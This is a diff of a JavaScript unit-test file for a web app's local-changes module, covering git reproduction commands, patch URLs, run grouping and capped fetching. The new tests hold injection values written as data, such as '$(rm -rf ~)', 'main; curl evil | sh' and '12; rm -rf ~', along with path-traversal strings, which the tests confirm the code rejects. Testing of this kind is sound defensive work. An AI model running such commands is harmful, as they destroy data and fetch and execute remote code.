@@ -3,8 +3,8 @@
  * Run with: cd webapp && npm test -- localChanges
  */
 import {
-  changes_summary, changes_sentence, git_commands, group_local_changes, index_patch, omitted_message, patch_url,
-  safe_relative_path, state_key, unpushed_commit, unpushed_text,
+  changes_summary, changes_sentence, fetch_capped_text, git_commands, group_local_changes, index_patch, omitted_message,
+  patch_url, restore_command, state_key, unpushed_commit, unpushed_text,
 } from '../localChanges';
 import { filter_batch } from '../../../utils';
 import { language } from '../../../viewers/text';
@@ -39,14 +39,30 @@ describe('wording', () => {
     expect(omitted_message({ omitted: 'timeout' })).toMatch(/took too long/);
     expect(omitted_message({ omitted: 'unreadable' })).toMatch(/couldn't be read/);
     expect(omitted_message({ omitted: 'error' })).toMatch(/git failed/);
+    expect(omitted_message({ omitted: 'no_answer' })).toBe("The server didn't answer when the run started: the patch wasn't saved.");
   });
 
-  it('says how to reproduce with git', () => {
+  it('says how to reproduce with git, from the patches saved', () => {
     expect(git_commands(changes())).toEqual(['git checkout 3f2a1b9c0d1e2f30 && git apply local-changes.patch']);
-    expect(git_commands(changes({ base: 'bbbb', pushed: false, unpushed: { path: '.qaboard/unpushed.patch', bytes: 10, sha256: 'u' } }))).toEqual([
+    const unpushed = { base: 'bbbbbbbb', pushed: false, unpushed: { path: '.qaboard/unpushed.patch', bytes: 10, sha256: 'u' } };
+    expect(git_commands(changes(unpushed))).toEqual([
       'git checkout 3f2a1b9c0d1e2f30 && git apply local-changes.patch',
-      'git checkout bbbb && git apply unpushed.patch && git apply local-changes.patch',
+      'git checkout bbbbbbbb && git apply unpushed.patch && git apply local-changes.patch',
     ]);
+    // only what's saved
+    expect(git_commands(changes({ ...unpushed, patch: { omitted: 'level' } }))).toEqual(['git checkout bbbbbbbb && git apply unpushed.patch']);
+    expect(git_commands(changes({ patch: { omitted: 'too_large' } }))).toEqual([]);
+    expect(git_commands(changes({ head: undefined }))).toEqual([]);
+  });
+
+  it('never puts what runs sent in commands, unless it is a sha or an id', () => {
+    expect(git_commands(changes({ head: '$(rm -rf ~)' }))).toEqual([]);
+    expect(git_commands(changes({ base: 'main; curl evil | sh', pushed: false, unpushed: { path: '.qaboard/unpushed.patch' } }))).toEqual(['git checkout 3f2a1b9c0d1e2f30 && git apply local-changes.patch']);
+    expect(git_commands(changes({ head: 'ABCDEF12 && x' }))).toEqual([]);
+    expect(restore_command({ id: 12 })).toBe('qa restore 12');
+    expect(restore_command({ id: '12' })).toBe('qa restore 12');
+    expect(restore_command({ id: '12; rm -rf ~' })).toBeNull();
+    expect(restore_command({})).toBeNull();
   });
 });
 
@@ -54,7 +70,7 @@ describe('saved files', () => {
   it('only links to files inside the run', () => {
     expect(patch_url(run(1), changes())).toBe('/s/1/.qaboard/local-changes.patch');
     for (const path of ['../../etc/passwd', '/etc/passwd', 'https://evil.example/x', 'a//b', 'a\\b', ''])
-      expect(safe_relative_path(path)).toBeNull();
+      expect(patch_url(run(1), changes({ patch: { path } }))).toBeNull();
     expect(patch_url(run(1), changes({ patch: { omitted: 'level' } }))).toBeNull();
   });
 });
@@ -71,22 +87,36 @@ describe('group_local_changes', () => {
   });
 
   it('says when all the runs share one state', () => {
-    expect(group_local_changes([run(1, changes()), run(2, changes())]).shared).toBe('aaa');
-    expect(group_local_changes([run(1, changes({ dirty: false })), run(2, changes({ dirty: false }))]).shared).toBe('clean');
-    // unpushed commits are part of the state
-    expect(state_key(changes({ pushed: false, unpushed: { sha256: 'u1' } }))).not.toBe(state_key(changes({ pushed: false, unpushed: { sha256: 'u2' } })));
+    expect(group_local_changes([run(1, changes()), run(2, changes())]).shared).toBe('3f2a1b9c0d1e2f30:aaa');
+    expect(group_local_changes([run(1, changes({ dirty: false })), run(2, changes({ dirty: false }))]).shared).toBe('3f2a1b9c0d1e2f30:clean');
+    // the commit and the unpushed commits are part of the state
+    expect(state_key(changes({ pushed: false, unpushed: { sha256: 'u1' } })).key).not.toBe(state_key(changes({ pushed: false, unpushed: { sha256: 'u2' } })).key);
+    expect(group_local_changes([run(1, changes()), run(2, changes({ head: '0000000000000000' }))]).groups).toHaveLength(2);
+  });
+
+  it("doesn't call runs the same when it can't tell", () => {
+    // summary only: no content address, even with the same counts
+    const summary = changes({ sha256: undefined, patch: { omitted: 'level' } });
+    const two = group_local_changes([run(1, summary), run(2, summary)]);
+    expect(two.groups).toHaveLength(2);
+    expect(two.shared).toBeNull();
+    const one = group_local_changes([run(1, summary)]);
+    expect(one).toMatchObject({ single: true, shared: null });
+    // unknown runs are listed together, but not shared
+    expect(group_local_changes([run(1, changes({ dirty: null })), run(2, changes({ dirty: null }))])).toMatchObject({ single: true, shared: null });
+    // nor a commit that isn't a sha
+    expect(group_local_changes([run(1, changes({ head: 'main' })), run(2, changes({ head: 'main' }))]).shared).toBeNull();
     expect(group_local_changes([run(1), run(2)])).toMatchObject({ has_data: false, shared: null });
   });
 
-  it('is fast on many runs', () => {
+  it('groups many runs', () => {
     const outputs = Array.from({ length: 20000 }, (_, i) => run(i, changes({ sha256: `${i % 7}` })));
-    const start = performance.now();
-    expect(group_local_changes(outputs).groups).toHaveLength(7);
-    expect(performance.now() - start).toBeLessThan(200);
+    expect(group_local_changes(outputs).groups.map(g => g.count).reduce((a, b) => a + b)).toBe(20000);
   });
 
   it('finds unpushed commits', () => {
-    expect(unpushed_commit([run(1, changes()), run(2, changes({ pushed: false }))])).toMatchObject({ sha: '3f2a1b9c0d1e2f30' });
+    expect(unpushed_commit([run(1, changes()), run(2, changes({ pushed: false, base: 'bbbbbbbb' }))])).toEqual({ sha: '3f2a1b9c0d1e2f30', base: 'bbbbbbbb' });
+    expect(unpushed_commit([run(1, changes({ pushed: false, head: 'x; y', base: 'main' }))])).toEqual({ sha: null, base: null });
     expect(unpushed_commit([run(1, changes({ pushed: true }))])).toBeNull();
   });
 });
@@ -99,6 +129,22 @@ describe('index_patch', () => {
     expect(files.get('src/a.py')).toBe(1);
     expect(files.get('new.txt')).toBe(8);
     expect(index_patch(undefined).files.size).toBe(0);
+    // paths with " b/" in them, and CRLF
+    const tricky = index_patch('diff --git a/x b/y.txt b/x b/y.txt\r\n+1\r\n');
+    expect([...tricky.files.keys()]).toEqual(['x b/y.txt']);
+  });
+});
+
+describe('fetch_capped_text', () => {
+  afterEach(() => vi.unstubAllGlobals());
+  it('reads patches up to a size, whatever the run said', async () => {
+    vi.stubGlobal('fetch', vi.fn(async () => new Response('x'.repeat(1000))));
+    expect(await fetch_capped_text('/p', 2000)).toEqual({ text: 'x'.repeat(1000) });
+    expect(await fetch_capped_text('/p', 500)).toMatchObject({ too_large: true });
+    vi.stubGlobal('fetch', vi.fn(async () => new Response('x', { headers: { 'Content-Length': '99999999' } })));
+    expect(await fetch_capped_text('/p', 500)).toEqual({ too_large: true, bytes: 99999999 });
+    vi.stubGlobal('fetch', vi.fn(async () => new Response('no', { status: 404, statusText: 'NOT FOUND' })));
+    await expect(fetch_capped_text('/p', 500)).rejects.toThrow('404');
   });
 });
 
